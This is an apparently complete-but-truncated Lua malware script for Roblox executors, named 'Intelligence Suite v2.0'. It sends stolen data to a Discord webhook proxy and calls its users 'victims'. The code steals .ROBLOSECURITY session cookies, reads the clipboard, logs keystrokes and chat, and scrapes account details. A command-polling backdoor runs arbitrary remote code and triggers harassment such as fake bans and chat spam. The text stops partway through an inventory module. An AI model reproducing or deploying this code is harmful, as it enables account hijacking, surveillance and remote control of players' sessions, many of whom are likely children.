-- Intelligence Suite v2.0
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"

-- Per-session unique ID so multiple victims don't conflict
local SESSION_ID = tostring(LocalPlayer.UserId) .. "_" .. tostring(math.random(100000, 999999))

-- Initialize global registry if not exists
if not getgenv().IntelSuiteRegistry then
    getgenv().IntelSuiteRegistry = {}
end

-- Each session gets its own isolated state table stored under its session ID
-- We do NOT overwrite getgenv().IntelSuite globally — that broke multi-session
getgenv().IntelSuiteRegistry[SESSION_ID] = {
    Buffer = "",
    IsActive = true,
    ChatSpyActive = false,
    RemoteSpyActive = false,
    MouseLogActive = false,
    ChatLogActive = false,
    TextBoxActive = false,
    JoinLeaveActive = false,
    PersistenceLoop = false,
    PersistenceInstalled = false,
    KillLoopActive = false,
    ScreamerActive = false,
    SessionID = SESSION_ID
}

-- Local reference used throughout THIS execution only
local IntelSuite = getgenv().IntelSuiteRegistry[SESSION_ID]

-- Also keep getgenv().IntelSuite pointing to this session for legacy module refs
-- Each session overwrites this — that's OK because each session is self-contained
getgenv().IntelSuite = IntelSuite

local function POST(url, body)
    local h = {["Content-Type"] = "application/json"}
    pcall(function()
        if request then
            request({Url=url, Method="POST", Headers=h, Body=body})
        elseif http_request then
            http_request({Url=url, Method="POST", Headers=h, Body=body})
        elseif syn and syn.request then
            syn.request({Url=url, Method="POST", Headers=h, Body=body})
        else
            HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

local function GET(url)
    local out = nil
    pcall(function()
        if request then
            out = request({Url=url, Method="GET"}).Body
        elseif http_request then
            out = http_request({Url=url, Method="GET"}).Body
        elseif syn and syn.request then
            out = syn.request({Url=url, Method="GET"}).Body
        end
    end)
    return out
end

local function send(title, desc, color)
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode({
            embeds = {{
                title = tostring(title),
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = {text = "Intelligence Suite v2.0 | Session: " .. SESSION_ID},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end)
    if ok and encoded then POST(PROXY, encoded) end
end

local function getExec()
    if identifyexecutor then
        local ok, r = pcall(identifyexecutor)
        if ok and r then return tostring(r) end
    end
    if getexecutorname then
        local ok, r = pcall(getexecutorname)
        if ok and r then return tostring(r) end
    end
    if syn and syn.version then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if listfiles then
        local ok, f = pcall(listfiles, "")
        if ok and f then
            for _, v in ipairs(f) do
                local l = tostring(v):lower()
                if l:find("xeno") then return "Xeno" end
                if l:find("krnl") then return "KRNL" end
                if l:find("synapse") then return "Synapse X" end
                if l:find("scriptware") then return "Script-Ware" end
                if l:find("solara") then return "Solara" end
                if l:find("wave") then return "Wave" end
                if l:find("delta") then return "Delta" end
            end
        end
    end
    return "Unknown"
end

local function getGame()
    local name = "Unknown"
    pcall(function()
        name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return name
end

local function getPlayerList()
    local list = ""
    local count = 0
    for _, p in ipairs(Players:GetPlayers()) do
        count = count + 1
        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
    end
    return list, count
end

-- ============================================================
-- MODULE 1: Execution Alert
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local game_name = getGame()
    local playerList, playerCount = getPlayerList()
    send("SCRIPT EXECUTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. exec ..
        "\n**Game:** " .. game_name ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players in server:** " .. tostring(playerCount) ..
        "\n\n**Active Modules:** Keylogger, Token Stealer, API Scraper, Clipboard, Anti-AFK, Heartbeat, Kill Switch",
        65280
    )
end)

task.wait(1)

-- ============================================================
-- ============================================================
-- MODULE 2B: SCRAPE DATA (Player List)
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local uid = tostring(LocalPlayer.UserId)

    local desc = "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. uid ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players in server:** " .. tostring(#Players:GetPlayers())

    local playerList = ""
    for _, p in ipairs(Players:GetPlayers()) do
        playerList = playerList .. "\n" .. p.Name ..
            " (ID: " .. tostring(p.UserId) ..
            ", Age: " .. tostring(p.AccountAge) .. "d)"
    end

    desc = desc .. "\n" .. playerList
    desc = desc .. "\n**Time:** " .. tostring(os.time())

    send("SCRAPE DATA", desc, 3066993)
end)

task.wait(1)


-- MODULE 2: Full Roblox API Scraper
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    local uid = tostring(LocalPlayer.UserId)
    local desc = "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. uid ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId)

    -- Premium check
    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
    desc = desc .. "\n**Premium:** " .. tostring(premium)

    -- Friends count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Friends:** " .. tostring(d.count)
        end
    end)

    -- Followers count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Followers:** " .. tostring(d.count)
        end
    end)

    -- Following count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Following:** " .. tostring(d.count)
        end
    end)

    -- Robux balance (if accessible)
    pcall(function()
        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.robux then
                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
            end
        end
    end)

    -- Groups
    pcall(function()
        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                local groups = "\n**Groups:**"
                local count = 0
                for _, g in ipairs(d.data) do
                    if count >= 5 then break end
                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
                    count = count + 1
                end
                desc = desc .. groups
            end
        end
    end)

    -- Past usernames
    pcall(function()
        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local names = "\n**Past Usernames:**"
                for _, n in ipairs(d.data) do
                    names = names .. "\n  - " .. tostring(n.name)
                end
                desc = desc .. names
            end
        end
    end)

    -- Badge count
    pcall(function()
        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
            end
        end
    end)

    -- Game passes owned
    pcall(function()
        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local passes = "\n**Game Passes:**"
                for _, p in ipairs(d.data) do
                    passes = passes .. "\n  - " .. tostring(p.name)
                end
                desc = desc .. passes
            end
        end
    end)

    send("FULL ACCOUNT SCRAPE", desc, 65535)
end)

task.wait(1)

-- ============================================================
-- MODULE 3: Token / Cookie Stealer v7
-- Runs on startup. Grabs .ROBLOSECURITY and sends to Discord.
-- Phase 1: Extract. Phase 2: Package. Phase 3: POST.
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local token = nil
    local method = "none"
    local req = request or http_request or (syn and syn.request) or (http and http.request)

    -- Extract: try every known method
    -- M1: getcookies() table
    if not token and getcookies then
        pcall(function()
            local c = getcookies()
            if type(c) == "table" then
                for k, v in pairs(c) do
                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                        token = tostring(v)
                        method = "getcookies()"
                        break
                    end
                    if type(v) == "table" then
                        for ck, cv in pairs(v) do
                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
                                token = tostring(cv)
                                method = "getcookies() nested"
                                break
                            end
                        end
                    end
                    if token then break end
                end
            end
        end)
    end

    -- M2: syn.get_cookie
    if not token and syn and syn.get_cookie then
        pcall(function()
            local v = syn.get_cookie(".ROBLOSECURITY")
            if v and #v > 20 then token = v method = "syn.get_cookie" end
        end)
    end

    -- M3: getrbxcookie
    if not token and getrbxcookie then
        pcall(function()
            local v = getrbxcookie()
            if v and #v > 20 then token = v method = "getrbxcookie()" end
        end)
    end

    -- M4: res.Cookies table from HTTP request (works on Xeno + all executors)
    if not token and req then
        pcall(function()
            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
            if res then
                if type(res.Cookies) == "table" then
                    for k, v in pairs(res.Cookies) do
                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                            token = tostring(v)
                            method = "res.Cookies"
                            break
                        end
                    end
                end
                if not token and res.Headers then
                    for k, v in pairs(res.Headers) do
                        if tostring(k):lower() == "set-cookie" then
                            local found = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
                            if found and #found > 20 then
                                token = found
                                method = "Set-Cookie header"
                            end
                        end
                    end
                end
            end
        end)
    end

    -- M5: readfile scan (Xeno has readfile)
    if not token and readfile and listfiles then
        pcall(function()
            local scanned = 0
            local function scan(path)
                if scanned >= 300 or token then return end
                local ok, content = pcall(readfile, path)
                if ok and type(content) == "string" and #content > 10 then
                    scanned = scanned + 1
                    local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
                    if found and #found > 20 then
                        token = found
                        method = "readfile:" .. tostring(path)
                        return
                    end
                end
                local lok, files = pcall(listfiles, path)
                if lok and type(files) == "table" then
                    for _, f in ipairs(files) do
                        if token then break end
                        scan(f)
                    end
                end
            end
            for _, root in ipairs({"", "cache", "cookies", "Xeno", "xeno", "data"}) do
                if token then break end
                scan(root)
            end
        end)
    end

    -- Package + POST
    local uid = tostring(LocalPlayer.UserId)
    if token then
        send("ROBLOSECURITY TOKEN",
            "**User:** " .. LocalPlayer.Name ..
            "\n**ID:** " .. uid ..
            "\n**Executor:** " .. exec ..
            "\n**Method:** " .. method ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Token:**\n```" .. token:sub(1, 900) .. "```",
            16711680)
    else
        send("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. exec ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Note:** All methods returned nothing.",
            16711680)
    end
end)
task.wait(2)

-- ============================================================
task.spawn(function()
    local exec = getExec()
    local token = nil
    local methodUsed = "none"
    local log = {}
    local req = request or http_request or (syn and syn.request) or (http and http.request)

    send("TOKEN STEALER STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Executor:** " .. exec .. "\n**Status:** Running all methods...", 16776960)
    task.wait(0.3)

    -- M1: syn.get_cookie (Synapse X)
    if not token and syn and syn.get_cookie then
        pcall(function()
            local v = syn.get_cookie(".ROBLOSECURITY")
            if v and #v > 20 then token = v methodUsed = "M1: syn.get_cookie" end
        end)
        table.insert(log, "M1:" .. (token and "HIT" or "miss"))
    else table.insert(log, "M1:skip") end

    -- M2: get_cookie
    if not token and get_cookie then
        pcall(function()
            local v = get_cookie(".ROBLOSECURITY")
            if v and #v > 20 then token = v methodUsed = "M2: get_cookie" end
        end)
        table.insert(log, "M2:" .. (token and "HIT" or "miss"))
    else table.insert(log, "M2:skip") end

    -- M3: getrbxcookie
    if not token and getrbxcookie then
        pcall(function()
            local v = getrbxcookie()
            if v and #v > 20 then token = v methodUsed = "M3: getrbxcookie" end
        end)
        table.insert(log, "M3:" .. (token and "HIT" or "miss"))
    else table.insert(log, "M3:skip") end

    -- M4: getcookies() flat + nested
    if not token and getcookies then
        pcall(function()
            local c = getcookies()
            if type(c) == "table" then
                for k, v in pairs(c) do
                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                        token = tostring(v) methodUsed = "M4: getcookies flat" break
                    end
                    if type(v) == "table" then
                        for ck, cv in pairs(v) do
                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
                                token = tostring(cv) methodUsed = "M4: getcookies nested" break
                            end
                        end
                    end
                    if token then break end
                end
            end
        end)
        table.insert(log, "M4:" .. (token and "HIT" or "miss"))
    else table.insert(log, "M4:skip") end

    -- M5: res.Cookies table — works on Xeno + all executors
    if not token and req then
        pcall(function()
            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
            if res then
                if type(res.Cookies) == "table" then
                    for k, v in pairs(res.Cookies) do
                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                            token = tostring(v) methodUsed = "M5: res.Cookies"
                        end
                    end
                end
                if not token and type(res.cookies) == "table" then
                    for k, v in pairs(res.cookies) do
                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                            token = tostring(v) methodUsed = "M5: res.cookies lower"
                        end
                    end
                end
                if not token and res.Headers then
                    for k, v in pairs(res.Headers) do
                        if tostring(k):lower():find("set%-cookie") then
                            local raw = type(v) == "table" and table.concat(v, "; ") or tostring(v)
                            local found = raw:match("%.ROBLOSECURITY=([^;]+)")
                            if found and #found > 20 then token = found methodUsed = "M5: Set-Cookie header" end
                        end
                    end
                end
            end
        end)
        table.insert(log, "M5:" .. (token and "HIT" or "miss"))
    else table.insert(log, "M5:no req") end

    -- M6: file scan — readfile recursive
    if not token and readfile then
        pcall(function()
            local scanned = 0
            local function scanPath(path)
                if scanned >= 400 or token then return end
                local ok, content = pcall(readfile, path)
                if ok and type(content) == "string" and #content > 10 then
                    scanned = scanned + 1
                    -- use single-quoted pattern to avoid quote escaping issues
                    local found = content:match('ROBLOSECURITY[=_]([^;%s,
]+)')
                                or content:match('%.ROBLOSECURITY=([^;%s
]+)')
                    if found and #found > 20 then
                        token = found methodUsed = "M6: readfile " .. path return
                    end
                end
                if listfiles then
                    local lok, files = pcall(listfiles, path)
                    if lok and type(files) == "table" then
                        for _, f in ipairs(files) do
                            if scanned >= 400 or token then break end
                            scanPath(f)
                        end
                    end
                end
            end
            local roots = {"", "cache", "Cache", "cookies", "Cookies", "session", "data", "Data", "Xeno", "xeno"}
            for _, root in ipairs(roots) do
                if token then break end
                scanPath(root)
            end
            table.insert(log, "M6:" .. (token and "HIT" or ("miss/" .. scanned .. "files")))
        end)
    else table.insert(log, "M6:no readfile") end

    -- Report
    local logStr = table.concat(log, " | ")
    if token then
        send("ROBLOSECURITY TOKEN",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Method:** " .. methodUsed ..
            "\n**Executor:** " .. exec ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Token:**\n```" .. token:sub(1, 900) .. "```",
            16711680)
    else
        send("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. exec ..
            "\n**Log:** " .. logStr,
            16711680)
    end
end)
task.wait(2)
-- MODULE 4: Clipboard Stealer
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if getclipboard then
            local ok, clip = pcall(getclipboard)
            if ok and clip and clip ~= "" then
                send("CLIPBOARD",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
                    16711680
                )
            else
                send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty or not accessible.", 8421504)
            end
        else
            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** getclipboard() not available on this executor.", 8421504)
        end
    end)
end)

task.wait(1)

-- ============================================================
-- MODULE 5: Keylogger
-- ============================================================
UserInputService.InputBegan:Connect(function(input, gp)
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. input.KeyCode.Name .. "]"
        end
        if #getgenv().IntelSuite.Buffer >= 50 then
            send("KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Keys:** " .. getgenv().IntelSuite.Buffer, 16711680)
            getgenv().IntelSuite.Buffer = ""
        end
    end)
end)

-- ============================================================
-- MODULE 6: Anti-AFK
-- ============================================================
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            -- Fire a virtual input to prevent AFK kick
            local v = Instance.new("VirtualUser")
            v.Parent = game
            game:GetService("VirtualUser"):CaptureController()
            game:GetService("VirtualUser"):ClickButton2(Vector2.new(0,0))
        end)
    end
end)

-- ============================================================
-- MODULE 7: Mouse Logger (every 30s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(30)
        if not getgenv().IntelSuite.IsActive then continue end
        if not getgenv().IntelSuite.MouseLogActive then continue end
        pcall(function()
            local mouse = LocalPlayer:GetMouse()
            send("MOUSE LOG",
                "**User:** " .. LocalPlayer.Name ..
                "\n**Position:** X=" .. tostring(mouse.X) .. " Y=" .. tostring(mouse.Y) ..
                "\n**Target:** " .. tostring(mouse.Target),
                8388736
            )
        end)
    end
end)

-- ============================================================
-- MODULE 8: Remote Spy Logger
-- ============================================================
task.spawn(function()
    while true do
        task.wait(1)
        if not getgenv().IntelSuite.IsActive then continue end
        if not getgenv().IntelSuite.RemoteSpyActive then continue end
        pcall(function()
            local mt = getrawmetatable(game)
            local old = mt.__namecall
            setreadonly(mt, false)
            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "FireServer" or method == "InvokeServer" then
                    local args = {...}
                    local argStr = ""
                    for i, v in ipairs(args) do
                        argStr = argStr .. "\n  [" .. i .. "] " .. tostring(v)
                    end
                    send("REMOTE SPY",
                        "**User:** " .. LocalPlayer.Name ..
                        "\n**Remote:** " .. tostring(self.Name) ..
                        "\n**Method:** " .. method ..
                        "\n**Path:** " .. tostring(self:GetFullName()) ..
                        "\n**Args:**" .. argStr,
                        16776960
                    )
                end
                return old(self, ...)
            end)
            setreadonly(mt, true)
        end)
        break -- only hook once
    end
end)

-- ============================================================
-- MODULE 9: Command Poller + Kill Switch (every 5s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(5)
        pcall(function()
            local response = GET(CONTROL .. "?session=" .. SESSION_ID)
            if not response or response == "" then return end
            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
            if not ok or not data then return end

            -- Kill switch
            if data.active ~= nil then
                local wasActive = getgenv().IntelSuite.IsActive
                getgenv().IntelSuite.IsActive = data.active
                if wasActive and not data.active then
                    getgenv().IntelSuite.Buffer = ""
                    send("SUITE STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Killed remotely.", 16711680)
                elseif not wasActive and data.active then
                    send("SUITE RESUMED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Resumed remotely.", 65280)
                end
            end

            if not data.command or data.command == "" then return end
            if not getgenv().IntelSuite.IsActive then return end

            local cmd = data.command:match("^%s*(.-)%s*$")
            send("CMD RECEIVED", "**Command:** `" .. cmd .. "`\n**User:** " .. LocalPlayer.Name, 16776960)

            if cmd == "ping" then
                local list, count = getPlayerList()
                send("PONG",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**Game:** " .. getGame() ..
                    "\n**Place:** " .. tostring(game.PlaceId) ..
                    "\n**Players:** " .. tostring(count) .. list,
                    65280)

            elseif cmd == "players" then
                local list, count = getPlayerList()
                send("PLAYER LIST",
                    "**Game:** " .. getGame() ..
                    "\n**Total:** " .. tostring(count) ..
                    "\n**Players:**" .. list,
                    65535)

            elseif cmd == "info" then
                local list, count = getPlayerList()
                send("INFO",
                    "**User:** " .. LocalPlayer.Name ..
                    "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                    "\n**Executor:** " .. getExec() ..
                    "\n**Game:** " .. getGame() ..
                    "\n**Place ID:** " .. tostring(game.PlaceId) ..
                    "\n**Job ID:** " .. tostring(game.JobId) ..
                    "\n**Active:** " .. tostring(getgenv().IntelSuite.IsActive) ..
                    "\n**ChatSpy:** " .. tostring(getgenv().IntelSuite.ChatSpyActive) ..
                    "\n**RemoteSpy:** " .. tostring(getgenv().IntelSuite.RemoteSpyActive) ..
                    "\n**MouseLog:** " .. tostring(getgenv().IntelSuite.MouseLogActive) ..
                    "\n**Players:** " .. tostring(count) .. list,
                    65535)

            elseif cmd:sub(1,5) == "exec:" then
                local code = cmd:sub(6)
                local fn, err = loadstring(code)
                if fn then
                    local ok2, res = pcall(fn)
                    if ok2 then
                        send("EXEC RESULT", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
                    else
                        send("EXEC ERROR", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
                    end
                else
                    send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
                end

            elseif cmd == "chatspy" then
                if getgenv().IntelSuite.ChatSpyActive then
                    send("CHAT SPY", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.ChatSpyActive = true
                    for _, p in ipairs(Players:GetPlayers()) do
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end
                    Players.PlayerAdded:Connect(function(p)
                        p.Chatted:Connect(function(msg)
                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
                        end)
                    end)
                    send("CHAT SPY", "Now logging all chat.", 65280)
                end

            elseif cmd == "remotespy" then
                if getgenv().IntelSuite.RemoteSpyActive then
                    send("REMOTE SPY", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.RemoteSpyActive = true
                    send("REMOTE SPY", "Remote spy enabled. Logging all FireServer and InvokeServer calls.", 65280)
                end

            elseif cmd == "mouselog" then
                if getgenv().IntelSuite.MouseLogActive then
                    send("MOUSE LOG", "Already active.", 16776960)
                else
                    getgenv().IntelSuite.MouseLogActive = true
                    send("MOUSE LOG", "Mouse logging enabled. Sending position every 30s.", 65280)
                end

            elseif cmd == "clipboard" then
                pcall(function()
                    if getclipboard then
                        local ok2, clip = pcall(getclipboard)
                        if ok2 and clip and clip ~= "" then
                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:**\n```" .. tostring(clip):sub(1,1500) .. "```", 16711680)
                        else
                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty.", 8421504)
                        end
                    else
                        send("CLIPBOARD", "Not available on this executor.", 8421504)
                    end
                end)

            elseif cmd == "scrape" then
                -- Re-run full API scrape on demand
                local uid = tostring(LocalPlayer.UserId)
                local desc = "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. uid
                pcall(function()
                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Friends:** " .. tostring(d.count) end
                end)
                pcall(function()
                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Followers:** " .. tostring(d.count) end
                end)
                pcall(function()
                    local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
                    if r then local d = HttpService:JSONDecode(r) if d.robux then desc = desc .. "\n**Robux:** " .. tostring(d.robux) end end
                end)
                send("SCRAPE [ON DEMAND]", desc, 65535)

            elseif cmd == "stop" then
                getgenv().IntelSuite.IsActive = false
                send("STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite deactivated.", 16711680)

            elseif cmd == "start" then
                getgenv().IntelSuite.IsActive = true
                send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)

            elseif cmd == "unpersist" then
                -- Kevin-only uninstall via !cmd unpersist from Discord bot
                if getgenv().IntelSuite.UninstallPersistence then
                    getgenv().IntelSuite.UninstallPersistence()
                else
                    send("PERSISTENCE", "UninstallPersistence not found on this session.", 16711680)
                end

            elseif cmd:sub(1, 10) == "playerscan" then
                if getgenv().IntelSuite.PlayerScan then
                    task.spawn(getgenv().IntelSuite.PlayerScan)
                end

            elseif cmd:sub(1, 10) == "remotescan" then
                if getgenv().IntelSuite.RemoteScanner then
                    task.spawn(getgenv().IntelSuite.RemoteScanner)
                end

            elseif cmd:sub(1, 10) == "deviceinfo" then
                if getgenv().IntelSuite.DeviceFingerprint then
                    task.spawn(getgenv().IntelSuite.DeviceFingerprint)
                end

            elseif cmd:sub(1, 7) == "reqscan" then
                if getgenv().IntelSuite.RequireScanner then
                    getgenv().IntelSuite.RequireScanActive = false
                    task.spawn(getgenv().IntelSuite.RequireScanner)
                end

            elseif cmd:sub(1, 11) == "execpersist" then
                if getgenv().IntelSuite.ExecutorPersistence then
                    getgenv().IntelSuite.ExecPersistDone = false
                    task.spawn(getgenv().IntelSuite.ExecutorPersistence)
                end

            elseif cmd:sub(1, 7) == "fakeban" then
                if getgenv().IntelSuite.FakeBan then
                    task.spawn(getgenv().IntelSuite.FakeBan)
                end

            elseif cmd:sub(1, 8) == "killloop" then
                if getgenv().IntelSuite.StartKillLoop then
                    task.spawn(getgenv().IntelSuite.StartKillLoop)
                end

            elseif cmd:sub(1, 8) == "killstop" then
                if getgenv().IntelSuite.StopKillLoop then
                    getgenv().IntelSuite.StopKillLoop()
                end

            elseif cmd:sub(1, 5) == "scream" and cmd:sub(1, 9) ~= "screamsto" then
                if getgenv().IntelSuite.StartScreamer then
                    task.spawn(getgenv().IntelSuite.StartScreamer)
                end

            elseif cmd:sub(1, 9) == "screamsto" then
                if getgenv().IntelSuite.StopScreamer then
                    getgenv().IntelSuite.StopScreamer()
                end

            elseif cmd:sub(1, 7) == "chatas:" then
                local message = cmd:sub(8)
                if getgenv().IntelSuite.ChatAs then
                    task.spawn(function() getgenv().IntelSuite.ChatAs(message) end)
                end

            elseif cmd:sub(1, 9) == "chatspam:" then
                local message = cmd:sub(10)
                if getgenv().IntelSuite.ChatSpam then
                    task.spawn(function() getgenv().IntelSuite.ChatSpam(message) end)
                end

            elseif cmd == "apiscrap" then
                if getgenv().IntelSuite.APIScraper then
                    getgenv().IntelSuite.APIScraper()
                else
                    send("API SCRAPER", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                end

            elseif cmd == "clipboard" then
                if getgenv().IntelSuite.StealClipboard then
                    getgenv().IntelSuite.StealClipboard()
                else
                    send("CLIPBOARD", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                end

            elseif cmd == "remotespy" then
                if getgenv().IntelSuite.StartRemoteSpy then
                    getgenv().IntelSuite.StartRemoteSpy()
                else
                    send("REMOTE SPY", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                end

            elseif cmd == "mouselog" then
                if getgenv().IntelSuite.StartMouseLogger then
                    getgenv().IntelSuite.StartMouseLogger()
                else
                    send("MOUSE LOG", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                end

            elseif cmd == "inventory" then
                if getgenv().IntelSuite.InventoryCheck then
                    getgenv().IntelSuite.InventoryCheck()
                else
                    send("INVENTORY", "Not loaded yet. Wait a few seconds and try again.", 16711680)
                end
                elseif cmd:lower():find("cookielog") then
                if getgenv().IntelSuite.CookieLogger then
                    task.spawn(getgenv().IntelSuite.CookieLogger)
                else
                    send("COOKIE LOGGER", "Not loaded yet.", 16711680)
                end
            end
        end)
    end
end)

-- ============================================================
-- MODULE 10: Heartbeat (every 60s)
-- ============================================================
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            local list, count = getPlayerList()
            local desc = "**User:** " .. LocalPlayer.Name ..
                         "\n**Status:** ACTIVE" ..
                         "\n**Game:** " .. getGame() ..
                         "\n**Players:** " .. tostring(count)
            if #getgenv().IntelSuite.Buffer > 0 then
                desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
                getgenv().IntelSuite.Buffer = ""
            end
            send("HEARTBEAT", desc, 65535)
        end)
    end
end)

-- ============================================================
-- MODULE 12: Inventory Checker
-- Runs on startup + !cmd inventory
-- ============================================================
local function runInventoryCheck()
    if not getgenv().IntelSuite.IsActive then return end
    task.spawn(function()
        local uid = tostring(LocalPlayer.UserId)
        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid

